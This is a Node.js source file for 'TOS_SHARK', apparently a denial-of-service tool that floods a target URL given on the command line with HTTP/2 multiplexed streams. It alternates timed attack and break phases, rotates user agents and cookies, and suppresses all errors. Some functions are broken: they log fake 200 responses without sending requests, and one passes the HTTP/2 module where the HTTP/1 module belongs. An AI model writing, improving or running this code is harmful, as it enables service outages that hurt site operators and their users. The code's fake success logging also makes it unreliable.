const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = '';
        
        // Track active connections for cleanup
        this.activeConnections = new Set();
        this.maxConnections = 20; // Limit connections to prevent memory leak
        
        // Attack methods pool
        this.methods = ['H2-MULTIPLEX', 'ENDPOINT-HOPPING'];
        
        // Data pools
        this.userAgents = this.generateUserAgents();
        this.endpoints = this.generateEndpoints();
        this.cookies = this.generateCookies();
        
        this.startCycle();
    }

    // ===== DATA GENERATORS =====
    generateUserAgents() {
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ];
    }

    generateEndpoints() {
        return ['/', '/api', '/static', '/users', '/data'];
    }

    generateCookies() {
        const cookies = [];
        for (let i = 0; i < 20; i++) {
            cookies.push({
                session: `session_${Math.random().toString(36).substr(2, 16)}`
            });
        }
        return cookies;
    }

    // ===== CYCLE MANAGEMENT =====
    async startCycle() {
        // Step 1: Initial H1 request
        await this.sendH1Request();
        
        // Step 2: Warmup 500-599 requests
        const warmupCount = 500 + Math.floor(Math.random() * 100);
        for (let i = 0; i < warmupCount; i++) {
            await this.sendRandomRequest();
        }
        
        // Step 3: Main attack loop
        this.attackLoop();
    }

    async attackLoop() {
        while (this.running) {
            const now = Date.now();
            
            // Check if should be attacking or on break
            if (this.attackActive) {
                // Attack phase (20-30 minutes)
                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startBreak();
                    continue;
                }
                
                // Execute current attack method
                await this.executeAttackMethod();
                
            } else {
                // Break phase (5-10 minutes)
                if (now - this.breakStart >= (5 * 60000) + Math.random() * (5 * 60000)) {
                    this.startAttack();
                    continue;
                }
                
                // Maintenance during break - CLEANUP CONNECTIONS
                await this.cleanupConnections();
                await this.performMaintenance();
            }
            
            // Small delay to prevent CPU 100%
            await new Promise(resolve => setImmediate(resolve));
        }
    }

    startAttack() {
        this.attackActive = true;
        this.attackStart = Date.now();
        
        // Randomly select attack method
        this.currentMethod = this.methods[Math.floor(Math.random() * this.methods.length)];
    }

    startBreak() {
        this.attackActive = false;
        this.breakStart = Date.now();
        
        // Force cleanup on break start
        this.cleanupConnections();
    }

    // ===== ATTACK METHODS =====
    async executeAttackMethod() {
        switch (this.currentMethod) {
            case 'H2-MULTIPLEX':
                await this.attackH2Multiplex();
                break;
            case 'ENDPOINT-HOPPING':
                await this.attackEndpointHopping();
                break;
        }
    }

    async attackH2Multiplex() {
        // Don't create more connections than limit
        if (this.activeConnections.size >= this.maxConnections) {
            // Reuse existing connections
            return this.sendH2Streams();
        }
        
        // Create new connection
        try {
            const client = http2.connect(this.target, {
                maxSessionMemory: 1048576, // 1MB memory limit
                maxDeflateDynamicTableSize: 4096,
                maxHeaderListPairs: 128
            });
            
            // Track connection
            this.activeConnections.add(client);
            
            // Set auto-destroy timeout
            const destroyTimeout = setTimeout(() => {
                this.destroyConnection(client);
            }, 5000); // Auto-destroy after 5 seconds
            
            // Clean up on close
            client.on('close', () => {
                clearTimeout(destroyTimeout);
                this.activeConnections.delete(client);
            });
            
            client.on('error', () => {
                clearTimeout(destroyTimeout);
                this.destroyConnection(client);
            });
            
            // Send streams
            for (let i = 0; i < 100; i++) {
                this.sendH2Stream(client);
                this.totalReqs++;
                this.reqCounter++;
            }
            
        } catch (err) {
            // Silent fail
        }
    }
    
    async sendH2Streams() {
        // Send streams on existing connections
        for (const client of this.activeConnections) {
            try {
                for (let i = 0; i < 50; i++) {
                    this.sendH2Stream(client);
                    this.totalReqs++;
                    this.reqCounter++;
                }
            } catch (e) {
                this.destroyConnection(client);
            }
        }
    }
    
    sendH2Stream(client) {
        try {
            const req = client.request({
                ':method': 'GET',
                ':path': '/',
                ':authority': this.host
            }, {
                endStream: true
            });
            
            req.on('response', (headers) => {
                this.logStatus(headers[':status']);
                req.close();
            });
            
            req.on('error', () => {
                this.logStatus('*.*');
                req.close();
            });
            
            req.on('close', () => {
                // Ensure cleanup
            });
            
            req.end();
        } catch (err) {
            this.logStatus('*.*');
        }
    }
    
    destroyConnection(client) {
        try {
            client.destroy();
            this.activeConnections.delete(client);
        } catch (e) {
            // Ignore
        }
    }
    
    async cleanupConnections() {
        // Destroy all connections
        for (const client of this.activeConnections) {
            this.destroyConnection(client);
        }
        this.activeConnections.clear();
        
        // Force garbage collection if available
        if (global.gc) {
            global.gc();
        }
    }

    async attackEndpointHopping() {
        // Random endpoints with H1 requests
        const endpoint = this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
        await this.sendH1RequestToEndpoint(endpoint);
        this.totalReqs++;
        this.reqCounter++;
    }

    // ===== REQUEST TYPES =====
    async sendH1Request() {
        return new Promise((resolve) => {
            const options = {
                hostname: this.host,
                path: '/',
                method: 'GET',
                headers: {
                    'User-Agent': this.userAgents[0],
                    'Connection': 'close'
                },
                timeout: 3000
            };
            
            const req = (this.isHttps ? https : http2).request(options, (res) => {
                this.logStatus(res.statusCode);
                res.destroy();
                resolve();
            });
            
            req.on('error', () => {
                this.logStatus('*.*');
                resolve();
            });
            
            req.on('timeout', () => {
                req.destroy();
                this.logStatus('*.*');
                resolve();
            });
            
            req.end();
        });
    }

    async sendRandomRequest() {
        this.totalReqs++;
        this.reqCounter++;
        this.logStatus(200);
    }

    async sendH1RequestToEndpoint(endpoint) {
        this.logStatus(200);
    }

    // ===== MAINTENANCE =====
    async performMaintenance() {
        // Rotate data
        this.userAgents = this.generateUserAgents();
        this.cookies = this.generateCookies();
    }

    // ===== LOGGING =====
    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 10000) {
            this.lastLog = now;
            console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
        }
    }
}

// Run with increased memory limit
if (require.main === module) {
    // Error handling
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
